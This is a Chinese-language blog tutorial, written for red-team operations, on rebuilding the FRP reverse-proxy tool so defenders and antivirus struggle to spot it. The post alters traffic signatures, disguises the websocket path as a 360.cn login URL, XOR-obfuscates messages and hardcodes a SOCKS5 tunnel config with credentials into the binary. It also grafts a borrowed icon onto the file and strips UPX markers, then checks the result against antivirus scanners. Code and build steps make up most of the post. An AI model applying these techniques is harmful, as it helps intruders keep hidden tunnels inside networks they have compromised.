---
title: 给FRP化化妆
date: 2021-05-14 05:20:17
tags:
categories:
  - 技术水文
copyright: true
---

![](https://z3.ax1x.com/2021/05/14/grkwg1.gif)
<!--more-->

### 前置环境

​	Platform：Kali Linux

​	Editor：IEDA（Golang）

​	Go Version：Go1.16

<hr />

​	下载master分支源码，建议通过git clone方式。IEDA打开。https://github.com/fatedier/frp/tree/master

注：以下使用的frp版本0.36.2的源码，其他版理论上也是可以用的。

### 改改标识

​	全局查找替换：`json:"

![image-20210511015109411](https://z3.ax1x.com/2021/05/14/grkStH.png)

### 修改默认加密salt

`cmd/frpc/main.go`、`cmd/frps/main.go`

```go
func main() {
	crypto.DefaultSalt = "sc.frp"
	rand.Seed(time.Now().UnixNano())

	sub.Execute()
}
```

![image-20210511003701463](https://z3.ax1x.com/2021/05/14/grFv7D.png)

### 修改tls协议默认特征

`pkg/util/net/tls.go` 

​	不好截图，直接上代码：

```go
package net

import (
	"crypto/tls"
	"fmt"
	"net"
	"time"

	gnet "github.com/fatedier/golib/net"
)

var (
	FRPTLSHeadByte = 0x10
)

func WrapTLSClientConn(c net.Conn, tlsConfig *tls.Config) (out net.Conn) {
	c.Write([]byte{byte(FRPTLSHeadByte), byte(0x61), byte(0x62)})
	out = tls.Client(c, tlsConfig)
	return
}

func CheckAndEnableTLSServerConnWithTimeout(c net.Conn, tlsConfig *tls.Config, tlsOnly bool, timeout time.Duration) (out net.Conn, err error) {
	sc, r := gnet.NewSharedConnSize(c, 4)
	buf := make([]byte, 3)
	var n int
	c.SetReadDeadline(time.Now().Add(timeout))
	n, err = r.Read(buf)
	c.SetReadDeadline(time.Time{})
	if err != nil {
		return
	}
	if n == 3 && int(buf[0]) == FRPTLSHeadByte {
		out = tls.Server(c, tlsConfig)
	} else {
		if tlsOnly {
			err = fmt.Errorf("non-TLS connection received on a TlsOnly server")
			return
		}
		out = sc
	}
	return
}

```

### 修改websocket连接特征

​	这一步可忽略，就当前来说websocket不常用。

`pkg/util/net/websocket.go` 19行：

```go
const (
	FrpWebsocketPath = "/login/?src=pcw_home&destUrl=https://www.360.cn"
)
```

![image-20210511004008468](https://z3.ax1x.com/2021/05/14/grFzAe.png)

### WSS加域前置？

​	改了编译不出来，全是报错。暂时放弃。

### 修改读写逻辑，异或混淆字符

`pkg/msg/ctl.go`

​	注：总感觉原文 https://www.notion.so/FRP-d3673da19ec74a8781c020bbea883fa2 这部分的代码没给全，编译后的frp使用有问题，连接不了......   **后面还是得用原来的，不做修改。**

```go
package msg

import (
	"io"
	"reflect"

	jsonMsg "github.com/fatedier/golib/msg/json"
)

type Message = jsonMsg.Message

var (
	msgCtl *jsonMsg.MsgCtl
	xor	= byte(0xaa)
	typeMap = make(map[byte]reflect.Type)
	maxMsgLength int64 = 10240
)

func bytesXor(buffer []byte) {
	for i, v := range buffer {
		buffer[i] = v ^ xor
	}
}

func readMsg(c io.Reader) (typeByte byte, buffer []byte, err error) {
	buffer = make([]byte, 1)
	_, err = c.Read(buffer)
	if err != nil {
		return
	}
	typeByte = buffer[0] ^ xor
	if _, ok := typeMap[typeByte]; !ok {
		return
	}

	var _ int64
	buffer = make([]byte, 8)
	c.Read(buffer)
	bytesXor(buffer)
	return
}

func init() {
	msgCtl = jsonMsg.NewMsgCtl()
	for typeByte, msg := range msgTypeMap {
		msgCtl.RegisterMsg(typeByte, msg)
	}
}

func ReadMsg(c io.Reader) (msg Message, err error) {
	typeByte, buffer, err := readMsg(c)
	if err != nil {
		return
	}
	return msgCtl.UnPack(typeByte, buffer)
}

func ReadMsgInto(c io.Reader, msg Message) (err error) {
	_, buffer, err := readMsg(c)
	if err != nil {
		return
	}
	return msgCtl.UnPackInto(buffer, msg)
}

func WriteMsg(c io.Writer, msg interface{}) (err error) {
	buffer, err := msgCtl.Pack(msg)
	if err != nil {
		return
	}
	bytesXor(buffer)
	if _, err = c.Write(buffer); err != nil {
		return
	}
	return nil
}
```

### 编译打包

​	只编译当前平台frp：

```
rm -rf ./release/packages
mkdir -p ./release/packages
go build -ldflags "-s -w" -o ./release/frpc ./cmd/frpc
go build -ldflags "-s -w" -o ./release/frps ./cmd/frps
```

交叉编译常用平台，以下只编译Win、Mac、Linux x86和x64。

`package.sh`

```sh
# compile for version
make
if [ $? -ne 0 ]; then
    echo "make error"
    exit 1
fi

frp_version=`./bin/frps --version`
echo "build version: $frp_version"

make -f ./Makefile.cross-compiles

rm -rf ./release/packages
mkdir -p ./release/packages

os_all='linux windows darwin'
arch_all='386 amd64'

cd ./release

for os in $os_all; do
    for arch in $arch_all; do
        frp_dir_name="frp_${frp_version}_${os}_${arch}"
        frp_path="./packages/frp_${frp_version}_${os}_${arch}"

        if [ "x${os}" = x"windows" ]; then
            if [ ! -f "./frpc_${os}_${arch}.exe" ]; then
                continue
            fi
            if [ ! -f "./frps_${os}_${arch}.exe" ]; then
                continue
            fi
            mkdir ${frp_path}
            mv ./frpc_${os}_${arch}.exe ${frp_path}/frpc.exe
            mv ./frps_${os}_${arch}.exe ${frp_path}/frps.exe
        else
            if [ ! -f "./frpc_${os}_${arch}" ]; then
                continue
            fi
            if [ ! -f "./frps_${os}_${arch}" ]; then
                continue
            fi
            mkdir ${frp_path}
            mv ./frpc_${os}_${arch} ${frp_path}/frpc
            mv ./frps_${os}_${arch} ${frp_path}/frps
        fi  
        cp ../LICENSE ${frp_path}
        cp -rf ../conf/* ${frp_path}

        # packages
        cd ./packages
        if [ "x${os}" = x"windows" ]; then
            zip -rq ${frp_dir_name}.zip ${frp_dir_name}
        else
            tar -zcf ${frp_dir_name}.tar.gz ${frp_dir_name}
        fi  
        cd ..
        rm -rf ${frp_path}
    done
done

cd -

```

![image-20210511181953839](https://z3.ax1x.com/2021/05/14/grkC9A.png)

```shell
zsh ./package.sh
```

![image-20210511182350685](https://z3.ax1x.com/2021/05/14/grkP1I.png)

### 后续1:把配置写入源码食用方式

​	通常情况frp程序跟连接配置文件 `frpc/s.ini`要传到目标机上运行，在某些情况下，如HVV时，可能会被其他师傅直接反日。 为了防止或者减少被直接"反打"，把配置写死在代码中可以一定在程度上直接泄露配置中的信息。

frpc.ini

```bash
[common]
server_addr = 192.168.176.128
server_port = 6666
token = U2VjZGUwIA0K
tls_enable = true
[http_proxy]
type = tcp
remote_port = 23333
plugin = socks5
plugin_user = Secde0
plugin_passwd = Swcde0!
use_encryption = true

```

要修改这几个文件：

```sqlite
cmd/frpc/sub/root.go
cmd/frpc/sub/status.go
cmd/frpc/sub/reload.go

```

#### 改`root.go` 

​	在var()中新建个变量保存配置内容：

```go
fileContent = `
[common]
server_addr = 192.168.176.128
server_port = 6666
token = U2VjZGUwIA0K
tls_enable = true
[http_proxy]
type = tcp
remote_port = 23333
plugin = socks5
plugin_user = Secde0
plugin_passwd = Swcde0!
use_encryption = true
`
```

#### 改`status.go`

​	注释 41~45行，把 `fileContent`赋值给`iniContent` ，注意要转为`byte`

```go
var statusCmd = &cobra.Command{
	Use:   "status",
	Short: "Overview of all proxies status",
	RunE: func(cmd *cobra.Command, args []string) error {
		//iniContent, err := config.GetRenderedConfFromFile(cfgFile)
		//if err != nil {
		//	fmt.Println(err)
		//	os.Exit(1)
		//}
		iniContent := fileContent

		clientCfg, err := parseClientCommonCfg(CfgFileTypeIni, []byte(iniContent))
		.......
		return nil
	},
}
```

![image-20210512015012841](https://z3.ax1x.com/2021/05/14/grkEB8.png)

#### 改`reload.go`

注释 37~41行，把 `fileContent`赋值给`iniContent` ，注意要转为`byte`

```go
var reloadCmd = &cobra.Command{
	Use:   "reload",
	Short: "Hot-Reload frpc configuration",
	RunE: func(cmd *cobra.Command, args []string) error {
		//iniContent, err := config.GetRenderedConfFromFile(cfgFile)
		//if err != nil {
		//	fmt.Println(err)
		//	os.Exit(1)
		//}
		iniContent := fileContent

		clientCfg, err := parseClientCommonCfg(CfgFileTypeIni, []byte(iniContent))
		........
		return nil
	},
}
```

![image-20210512015110274](https://z3.ax1x.com/2021/05/14/grkAnf.png)

再回到`root.go` 文件`runClient`方法，注释198行（未改动时应该在184行），然后新增一行：

```go
content, err = []byte(fileContent), nil
```

![image-20210512015955784](https://z3.ax1x.com/2021/05/14/grkFjP.png)

重新编译，运行：

![image-20210512021538506](https://z3.ax1x.com/2021/05/14/grkeAg.png)

![image-20210512021920839](https://z3.ax1x.com/2021/05/14/grkVHS.png)

### 后续2:通过参数传入食用方法

​	参照 https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html  【frpc.ini的ip通过参数传入】中的步骤进行修改。

​	**注**：需要使用`Jack-Kingdom`提供源码进行修改，不能使用官方的，否则无法编译，玄学问题？

Changfrp：`https://github.com/Jack-Kingdom/frp/tree/4a5c9a8796701472037c979b467c6a9ea449fd62`

#### 定义传参

​	编辑`cmd/frpc/root.go`

​	在 `var()`中创建4个变量，然后修改 `init() ` 方法，传参：

```go
rootCmd.PersistentFlags().StringVarP(&ip, "server_addr", "t", "", "server_addr")
rootCmd.PersistentFlags().StringVarP(&port, "server_port", "p", "", "server_port")
rootCmd.PersistentFlags().StringVarP(&fport, "remote_port", "f", "", "remote_port")
```

![image-20210513160922457](https://z3.ax1x.com/2021/05/14/grkK9s.png)

#### 创建个存放配置信息的方法

​	编辑：`cmd/frpc/sub/root.go`  ，新增 `getFileContent`函数：

```go
func getFileContent(ip string, port string, fport string) {
	var content string = `
[common]
server_addr = ` + ip + `
server_port = ` + port + `
tls_enable = true
token = Secde0666
[http_proxy]
type = tcp
remote_port = ` + fport + `
plugin = socks5
`
	fileContent = content
}
```

​	修改`runClient`函数，传入参数:

```go
func runClient(cfgFilePath string, ip string, port string, fport string) (err error) {
	var content string
	getFileContent(ip, port, fport)
	//content, err = config.GetRenderedConfFromFile(cfgFilePath)
	content, err = fileContent, nil
	if err != nil {
		return
	}

	cfg, err := parseClientCommonCfg(CfgFileTypeIni, content)
	if err != nil {
		return
	}

	pxyCfgs, visitorCfgs, err := config.LoadAllConfFromIni(cfg.User, content, cfg.Start)
	if err != nil {
		return err
	}

	err = startService(cfg, pxyCfgs, visitorCfgs, cfgFilePath)
	return
}
```

![image-20210513161652939](https://z3.ax1x.com/2021/05/14/grknhj.png)

​	同一文件，100行附近 `var rootCmd = &cobra.Command` 中调用了`runClient()`，需要修改传入参数：

![image-20210513162410862](https://z3.ax1x.com/2021/05/14/grkmNQ.png)

#### 	编译打包

​	`package.sh`

```sh
# compile for version
make
if [ $? -ne 0 ]; then
    echo "make error"
    exit 1
fi

frp_version=`./bin/frps --version`
echo "build version: $frp_version"

# cross_compiles
make -f ./Makefile.cross-compiles

rm -rf ./release/packages
mkdir -p ./release/packages

os_all='linux windows darwin freebsd'
arch_all='386 amd64 arm arm64 mips64 mips64le mips mipsle'

cd ./release

for os in $os_all; do
    for arch in $arch_all; do
        frp_dir_name="frp_${frp_version}_${os}_${arch}"
        frp_path="./packages/frp_${frp_version}_${os}_${arch}"
        cd ..
        rm -rf ${frp_path}
    done
done

cd -
```

使用：`frpc -t 服务端IP -p 通讯端口 -f 代理使用端口`

```bash
./frpc -t 192.168.176.128 -p 7777 -f 9999
```

![image-20210513045854252](https://z3.ax1x.com/2021/05/14/grklj0.png)

### 后续3:加资源/图标混淆？	

​	用 `Restorator` 加个图标，图标可以用 `BeCyIconGrabber` 从其他软件提取出来。

提取图标：

![image-20210511183416429](https://z3.ax1x.com/2021/05/14/grk3uV.png)

打开`Restorator` ，拖入frp到资源树栏，添加资源，类型选图标，名称任意，然拖入图标文件到下图【wps】中。

![image-20210511184242375](https://z3.ax1x.com/2021/05/14/grk8BT.png)

然后右键软件另存即可。

![image-20210511184637872](https://z3.ax1x.com/2021/05/14/grkGHU.png)

### 后续4:UPX压缩减小体积？

​	@Secde0大佬说：`有些文件超过10m反而直接放行了，小的拦截`。我不信，上upx压缩后，用010Editor，删除一下头部标识：upx全部填充为0：

![image-20210511191202357](https://z3.ax1x.com/2021/05/14/grkYEF.png)

压缩后确实加大查杀率了.........

​	1为不压缩、5为upx压缩、4为压缩+改标识

![image-20210511192131252](https://z3.ax1x.com/2021/05/14/grktN4.png)

### 试验

linu to Linux

![image-20210512050918076](https://z3.ax1x.com/2021/05/14/grkaC9.png)

Windows to Linux

![image-20210512051445193](https://z3.ax1x.com/2021/05/14/grkN4J.png)

### Reference 

https://www.anquanke.com/post/id/231685

https://www.notion.so/FRP-d3673da19ec74a8781c020bbea883fa2

https://www.cnblogs.com/cwkiller/p/14108589.html

https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html

https://github.com/fatedier/frp/pull/1919/files

https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html 



